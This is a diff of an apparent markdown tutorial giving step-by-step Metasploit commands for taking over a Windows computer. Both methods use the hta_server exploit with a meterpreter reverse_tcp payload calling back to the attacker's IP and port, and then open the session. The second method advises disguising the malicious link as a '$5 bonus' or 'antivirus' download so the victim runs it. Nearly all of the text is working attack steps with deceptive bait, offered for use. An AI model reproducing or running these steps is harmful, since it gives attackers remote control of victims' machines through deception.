@@ -102,49 +102,58 @@ Once you receive the message Installation is complete, click Continue to reboot 
 ## Open kali linux terminal
 
 --->>> update your kali linux using the command:
-'''' #apt-get update
-'''' #apt-get upgrade
+#apt-get update
+#apt-get upgrade
 
 --->>> log the system to attack tape:
-msfconsole
+#msfconsole
 
 ## We have two method 
 ### first method
 
 --->>> when you are in the console tape
 
-'''' #use exploit/windows/misc/hta_server
+#use exploit/windows/misc/hta_server
 
 --->>> open a new terminal to find your IP address and tape
 
-'''' #ifconfig
+#ifconfig
 
-'''' #set lhost "your Ip address"
-'''' #set srvhost "your Ip address"
+#set lhost "your Ip address"
+#set srvhost "your Ip address"
 
 --->>>set payload following comand
 
-'''' # set payload windows/meterpreter/reverse_tcp
-'''' # set lport 8111 
+#set payload windows/meterpreter/reverse_tcp
+#set lport 8111 
 
 --->>>tape exploit
-'''' #exploit
+#exploit
 
 --->>>copy the link from your terminal then open a browser and then paste it and download it and run it after 
+
+--->>>to connect over the sessions 
+
+#sessions -i 1
 
 ### second method
 
 --->>> when you are in the console tape
 
-'''' #use windows/misc/hta_server
+#use windows/misc/hta_server
 
-'''' #set uripath /name it like (get$5bonus) or (antivirus) etc....
+#set uripath /name it like (get$5bonus) or (antivirus) etc....
 
 --->>>tape exploit
 
-'''' #exploit
+#exploit
 
 --->>>copy the link from your terminal then open a browser and then paste it and download it and run it after 
+
+--->>>to connect over the sessions 
+
+#sessions -i 1
+
 
 ### we used the second method for the demo
 
